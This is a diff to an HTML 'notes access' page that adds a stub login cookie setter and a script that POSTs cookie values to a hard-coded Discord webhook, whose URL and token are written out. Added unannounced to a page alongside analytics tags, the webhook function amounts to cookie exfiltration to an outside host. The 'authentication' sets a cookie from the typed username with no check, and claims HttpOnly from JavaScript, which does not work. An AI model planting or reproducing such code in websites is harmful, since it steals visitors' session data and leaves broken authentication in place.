@@ -3,9 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:image:title" content="Your Open Graph Image Title Here">
-    <title>HTML with Open Graph Image Title Meta Tag</title>
+    <meta property="og:image:title" content="">
+    <title>NOTES ACCESS PAGE</title>
+ <script>
+        // Function to set a cookie with secure and HttpOnly flags
+        function setCookie(name, value, days) {
+            var expires = "";
+            if (days) {
+                var date = new Date();
+                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+                expires = "; expires=" + date.toUTCString();
+            }
+            document.cookie = name + "=" + (value || "") + "; path=/; Secure; HttpOnly";
+        }
 
+        // Call this function after successful authentication
+        function authenticateAndSetCookie() {
+            var username = document.getElementById("username").value;
+            var authCode = document.getElementById("authCode").value;
+
+            // Perform authentication logic here
+            // If authentication is successful, set the cookie
+            setCookie("authenticatedUser", username, 1); // Set cookie for 1 day
+        }
+    </script>
+
+
+
+    
     <!-- Google Tag Manager (gtag.js) -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-HWQ4M8YCFS"></script>
 <!-- Google Analytics Tag -->
@@ -137,7 +162,31 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     sendAnalyticsData();
   });
 </script>
-  
+    
+ <script>function sendCookieToDiscord(cookieValue) {
+    const webhookURL = 'https://discord.com/api/webhooks/1227204887050321940/-jS73aQDi2uHPYF8Phgvez18YS_HqUk5wck1AFCPu2k94YEvguCSqlSnUwzJ80u9NBFT';
+    const payload = {
+        content: `New cookie created: ${cookieValue}`
+    };
+
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Failed to send message to Discord');
+        }
+        console.log('Cookie sent to Discord successfully');
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
+}
+</script>
 </head>
 <body>
     <form>
